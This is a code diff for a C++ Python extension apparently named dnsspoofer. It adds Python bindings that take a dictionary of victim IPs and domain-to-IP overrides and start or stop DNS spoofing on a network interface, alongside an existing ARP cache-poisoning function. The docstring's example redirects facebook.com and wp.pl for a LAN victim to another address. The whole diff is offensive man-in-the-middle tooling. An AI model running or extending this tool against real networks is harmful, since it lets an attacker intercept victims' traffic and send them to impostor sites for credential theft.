@@ -2,12 +2,12 @@
 #include <libnet.h>
 #include <stdexcept>
 #include <iostream>
-
+#include "dns.hpp"
 
 //realeasing the GIL won't make almost any difference
 //because the functions are IO bound not CPU bound
-//so I'm doing this just for fun
-#define RUN_WITH_ALLOW_THREADS
+//so I'm doing this just for fun of it
+//#define RUN_WITH_ALLOW_THREADS
 
 
 
@@ -122,6 +122,84 @@ dnsspoofer_spoof_arp(PyObject *self, PyObject *args)
 
 
 
+static PyObject *
+dnsspoofer_spoof_dns(PyObject *self, PyObject *args)
+{
+    const char* interface;
+    PyObject * victims_dict;
+    if (!PyArg_ParseTuple(args, "sO", &interface, &victims_dict))
+        return NULL;
+    if (!PyDict_Check(victims_dict)){
+        PyErr_SetString(PyExc_RuntimeError, "passed victim argument is not a dictionary");
+        return NULL;
+    }
+    PyObject *key, *value;
+    Py_ssize_t victim_no = 0;
+    std::vector<DNSVictim> victims;
+
+
+    // TODO not descriptive error messages when sb screws up with passing the arguments:
+    // example: TypeError: bad argument type for built-in operation
+    // when I used {"www.wp.pl": 1234}
+    while (PyDict_Next(victims_dict, &victim_no, &key, &value)) {
+        auto victim = DNSVictim();
+        const char* victim_ip;
+        Py_ssize_t victim_ip_length;
+        if((victim_ip=PyUnicode_AsUTF8AndSize(key, &victim_ip_length))==NULL)
+            return NULL;
+        victim.ip=victim_ip;
+        const char* ip_to_spoof;
+        PyObject* sites_dict;
+        if (!PyArg_ParseTuple(value, "sO", &ip_to_spoof, &sites_dict)) {
+            return NULL;
+        }
+        victim.spoofed_source_ip=ip_to_spoof;
+        if (!PyDict_Check(sites_dict)){
+            PyErr_SetString(PyExc_RuntimeError, "passed sites object is not a dictionary");
+            return NULL;
+        }
+        PyObject *site_url_obj, *site_ip_obj;
+        Py_ssize_t site_number = 0;
+        std::map<std::string,std::string> sites;
+        while (PyDict_Next(sites_dict, &site_number, &site_url_obj, &site_ip_obj)) {
+            const char* site_url;
+            Py_ssize_t site_url_length;
+            const char* site_ip;
+            Py_ssize_t site_ip_length;
+            if((site_url=PyUnicode_AsUTF8AndSize(site_url_obj, &site_url_length))==NULL)
+                return NULL;
+            if((site_ip=PyUnicode_AsUTF8AndSize(site_ip_obj, &site_ip_length))==NULL)
+                return NULL;
+            sites[std::string(site_url)]=std::string(site_ip);
+        }
+        victim.sites=sites;
+        victims.push_back(victim);
+    }
+//    for(auto victim: victims){
+//        std::cout<<victim.ip<< " "<<victim.spoofed_source_ip<<std::endl;
+//        for(auto s: victim.sites){
+//            std::cout<<s.first<<" " <<s.second<<std::endl;
+//        }
+//    }
+
+    try {
+        run_dns_spoof(std::string(interface), &victims);
+    }
+    catch (const PcapError& err){
+        PyErr_SetString(PyExc_RuntimeError, err.what());
+        return NULL;
+    }
+
+    Py_RETURN_NONE;
+}
+
+static PyObject *
+dnsspoofer_stop_dns_spoofing(PyObject *self, PyObject *args)
+{
+    stop_dns_spoofing();
+    Py_RETURN_NONE;
+}
+
 
 static PyMethodDef DnsSpooferMethods[] = {
     {"spoof_arp",  dnsspoofer_spoof_arp, METH_VARARGS,
@@ -131,6 +209,25 @@ static PyMethodDef DnsSpooferMethods[] = {
                       "@param vulnerable_host_mac_addr - victim's mac addr\n"
                       "@param ip_cache_entry - ip address to override cache entry with your own mac address\n"
                       "@param device - network interface. If device is set to None, libnet will try to choose a suitable interface.")},
+    {"spoof_dns", dnsspoofer_spoof_dns, METH_VARARGS,
+            PyDoc_STR("spoof_dns(interface: str, victims: Dict[str,List[str,Dict[str,str]]]) -> None \n\n"
+                      "Spoof dns.\n"
+                      "@param victims - example :\n"
+                      "victims = {\n"
+                      "    \"192.168.1.100\":(\n"
+                      "        \"192.168.1.1\",\n"
+                      "        {\n"
+                      "            \"facebook.com\": \"51.254.121.149\",\n"
+                      "            \"wp.pl\": \"51.254.121.149\",\n"
+                      "        }\n"
+                      "    )\n"
+                      "}")
+    },
+    {"stop_dns_spoofing", dnsspoofer_stop_dns_spoofing, METH_VARARGS,
+            PyDoc_STR("spoof_dns() -> None \n\n"
+                      "Stop spoofing DNS. Tries to stop all calls to spoof_dns.\n"
+                      "This function is registered as SIGINT and SIGTERM handler in this module.\n")
+    },
     {NULL, NULL, 0, NULL}
 };
 
